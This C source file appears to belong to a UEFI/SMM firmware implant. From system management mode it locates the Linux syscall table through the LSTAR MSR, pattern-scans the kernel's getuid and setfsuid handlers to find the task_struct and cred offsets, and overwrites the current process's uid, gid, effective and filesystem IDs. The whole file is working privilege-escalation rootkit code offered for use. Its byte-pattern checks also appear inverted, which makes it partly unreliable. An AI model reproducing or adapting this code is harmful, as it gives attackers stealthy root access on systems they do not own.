#include "kernel.h"
#include "Uefi/UefiBaseType.h"
#include "smm.h"
#include "paging.h"
#include "efivars.h"

#define IA32_KERNEL_GS_BASE 0xC0000102
#define MSR_LSTAR		0xc0000082 /* long mode SYSCALL target */

#define DO_SYSCALL_64_CALL_OFFSET 0x00000077

#define SYS_GETUID  102
#define SYS_GETGID  104
#define SYS_GETEUID 107
#define SYS_GETEGID 108

#define SYS_SETFSUID 122
#define SYS_SETFSGID 123


struct CredOffsets {
    INT32 task_struct_offset;
    INT32 creds_offset;

    UINT8 uid_offset;
    UINT8 gid_offset;
    UINT8 euid_offset;
    UINT8 egid_offset;

    UINT8 fsuid_offset;
    UINT8 fsgid_offset;
};

static UINT64 rdmsr(UINT32 msr) {
    UINT32 low, high;
	asm volatile (
		"rdmsr"
		: "=a"(low), "=d"(high)
		: "c"(msr)
	);
	return ((UINT64)high << 32) | low;
}

static EFI_STATUS find_syscall_table(EFI_PHYSICAL_ADDRESS *out) {
    const EFI_VIRTUAL_ADDRESS entry_syscall_64_virt = rdmsr(MSR_LSTAR);
    EFI_PHYSICAL_ADDRESS entry_syscall_64_phys = 0;
    EFI_STATUS status = translate_virt_to_phys(entry_syscall_64_virt, gControlRegs.Cr3Kernel, &entry_syscall_64_phys);
    if (status != EFI_SUCCESS)
        return status;

    INT32 do_syscall_64_offset = * ((INT32 *) (entry_syscall_64_phys + DO_SYSCALL_64_CALL_OFFSET + 1));
    EFI_VIRTUAL_ADDRESS do_syscall_64_virt = (EFI_VIRTUAL_ADDRESS)
        ((INT64) entry_syscall_64_virt + (INT64) do_syscall_64_offset + DO_SYSCALL_64_CALL_OFFSET + 5);
    EFI_PHYSICAL_ADDRESS do_syscall_64_phys = 0;
    status = translate_virt_to_phys(do_syscall_64_virt, gControlRegs.Cr3Kernel, &do_syscall_64_phys);
    if (status != EFI_SUCCESS)
        return status;
         
    for (UINT8 *ptr = (UINT8 *) do_syscall_64_phys; ptr < (UINT8 *) (do_syscall_64_phys + 0xff); ptr++) {
        if (memcmp(ptr, "\x48\x8b\x04\xc5", 4)) {
            INT32 syscall_table_offset = * ((INT32 *) (ptr + 4));
            EFI_VIRTUAL_ADDRESS syscall_table_virt = (EFI_VIRTUAL_ADDRESS)
                syscall_table_offset < 0 ? 0xFFFFFFFF00000000ULL | syscall_table_offset : syscall_table_offset;
            return translate_virt_to_phys(syscall_table_virt, gControlRegs.Cr3Kernel, out);
        }
    }

    return EFI_NOT_FOUND;
}

static EFI_STATUS 
parse_offsets_from_syscall(EFI_PHYSICAL_ADDRESS syscall_table, UINT64 syscall, INT32 *task_struct_offset, INT32 *creds_struct_offset, UINT8 *cred_offset) {
    EFI_VIRTUAL_ADDRESS syscall_virt = (EFI_VIRTUAL_ADDRESS)((UINT64 *) syscall_table)[syscall];
    EFI_PHYSICAL_ADDRESS syscall_phys = 0;
    EFI_STATUS status = translate_virt_to_phys(syscall_virt, gControlRegs.Cr3Kernel, &syscall_phys);
    if (status != EFI_SUCCESS)
        return status;

    for (EFI_PHYSICAL_ADDRESS addr=syscall_phys; addr < (syscall_phys + 0xff); ++addr) {
        if (memcmp((void *) (addr + 0x00), "\x65\x48\x8b\x04\x25", 5) &&
            memcmp((void *) (addr + 0x09), "\x48\x8b\x80", 3) &&
            memcmp((void *) (addr + 0x10), "\x8b\x70", 2)) {

            if (task_struct_offset)
                *task_struct_offset =  *((INT32 *) (addr + 0x05));

            if (creds_struct_offset)
                *creds_struct_offset = *((INT32 *) (addr + 0x0c));

            if (cred_offset)
                *cred_offset = *((UINT8 *) (addr + 0x12));

            return EFI_SUCCESS;
        }
    }

    return EFI_NOT_FOUND;
}

static EFI_STATUS parse_fs_offsets_from_syscall(EFI_PHYSICAL_ADDRESS syscall_table, UINT64 syscall, UINT8 *cred_offset) {
    EFI_VIRTUAL_ADDRESS syscall_virt = (EFI_VIRTUAL_ADDRESS)((UINT64 *) syscall_table)[syscall];
    EFI_PHYSICAL_ADDRESS syscall_phys = 0;
    EFI_STATUS status = translate_virt_to_phys(syscall_virt, gControlRegs.Cr3Kernel, &syscall_phys);
    if (status != EFI_SUCCESS)
        return status;

    INT32 __sys_setfs_id_offset = *((INT32 *) (syscall_phys + 10)); 
    EFI_VIRTUAL_ADDRESS __sys_setfs_id_virt = (EFI_VIRTUAL_ADDRESS)
        (syscall_virt + 14 + ((INT64)__sys_setfs_id_offset));
    EFI_PHYSICAL_ADDRESS __sys_setfs_id_phys = 0;
    status = translate_virt_to_phys(__sys_setfs_id_virt, gControlRegs.Cr3Kernel, &__sys_setfs_id_phys);
    if (status != EFI_SUCCESS)
        return status;

    for (EFI_PHYSICAL_ADDRESS addr=__sys_setfs_id_phys; addr < (__sys_setfs_id_phys + 0xff); ++addr) {
        if (memcmp((void *) (addr + 0x00), "\x48\x8b\xa8", 3) &&
            memcmp((void *) (addr + 0x07), "\x8b\x75", 2)) {

            if (cred_offset)
                *cred_offset = *((UINT8 *) (addr + 9));

            return EFI_SUCCESS;
        }
    }

    return EFI_NOT_FOUND;
}

static EFI_STATUS resolv_offsets(EFI_PHYSICAL_ADDRESS syscall_table, struct CredOffsets *offsets) {
    EFI_STATUS status = 0;

    status = parse_offsets_from_syscall(syscall_table, SYS_GETUID, &offsets->task_struct_offset, &offsets->creds_offset, &offsets->uid_offset);
    if (status != EFI_SUCCESS)
        return status;

    status = parse_offsets_from_syscall(syscall_table, SYS_GETGID, NULL, NULL, &offsets->gid_offset);
    if (status != EFI_SUCCESS)
        return status;

    status = parse_offsets_from_syscall(syscall_table, SYS_GETEUID, NULL, NULL, &offsets->euid_offset);
    if (status != EFI_SUCCESS)
        return status;

    status = parse_offsets_from_syscall(syscall_table, SYS_GETEGID, NULL, NULL, &offsets->egid_offset);
    if (status != EFI_SUCCESS)
        return status;

    status = parse_fs_offsets_from_syscall(syscall_table, SYS_SETFSUID, &offsets->fsuid_offset);
    if (status != EFI_SUCCESS)
        return status;

    status = parse_fs_offsets_from_syscall(syscall_table, SYS_SETFSGID, &offsets->fsgid_offset);
    if (status != EFI_SUCCESS)
        return status;

    return EFI_SUCCESS;
}

static EFI_STATUS commit_creds(UINT32 uid, UINT32 gid, struct CredOffsets *offsets) {
    const EFI_VIRTUAL_ADDRESS gs_base_virt = rdmsr(IA32_KERNEL_GS_BASE);
    EFI_PHYSICAL_ADDRESS gs_base_phys = 0;
    EFI_STATUS status = translate_virt_to_phys(gs_base_virt, gControlRegs.Cr3Kernel, &gs_base_phys);
    if (status != EFI_SUCCESS)
        return status;

    const EFI_VIRTUAL_ADDRESS task_struct_virt = (EFI_VIRTUAL_ADDRESS)
        *((UINT64 *) (gs_base_phys + offsets->task_struct_offset));
    EFI_PHYSICAL_ADDRESS task_struct_phys = 0;
    status = translate_virt_to_phys(task_struct_virt, gControlRegs.Cr3Kernel, &task_struct_phys);
    if (status != EFI_SUCCESS)
        return status;

    const EFI_VIRTUAL_ADDRESS creds_struct_virt = (EFI_VIRTUAL_ADDRESS)
        *((UINT64 *) (task_struct_phys + offsets->creds_offset));
    EFI_PHYSICAL_ADDRESS creds_struct_phys = 0;
    status = translate_virt_to_phys(creds_struct_virt, gControlRegs.Cr3Kernel, &creds_struct_phys);
    if (status != EFI_SUCCESS)
        return status;

    UINT32 *uid_ptr  = (UINT32 *) (creds_struct_phys + offsets->uid_offset);
    UINT32 *gid_ptr  = (UINT32 *) (creds_struct_phys + offsets->gid_offset);
    UINT32 *euid_ptr = (UINT32 *) (creds_struct_phys + offsets->euid_offset);
    UINT32 *egid_ptr = (UINT32 *) (creds_struct_phys + offsets->egid_offset);

    UINT32 *fsuid_ptr = (UINT32 *) (creds_struct_phys + offsets->fsuid_offset);
    UINT32 *fsgid_ptr = (UINT32 *) (creds_struct_phys + offsets->fsgid_offset);

    *uid_ptr = uid;
    *euid_ptr = uid;
    *gid_ptr = gid;
    *egid_ptr = gid;
    *fsuid_ptr = uid;
    *fsgid_ptr = gid;

    return EFI_SUCCESS;
}

EFI_STATUS kernel_change_priv(UINT32 uid, UINT32 gid) {
    EFI_PHYSICAL_ADDRESS syscall_table = 0;
    EFI_STATUS status = find_syscall_table(&syscall_table);
    if (status != EFI_SUCCESS)
        return status;

    struct CredOffsets offsets;
    status = resolv_offsets(syscall_table, &offsets);
    if (status != EFI_SUCCESS)
        return status;

    return commit_creds(uid, gid, &offsets);
}
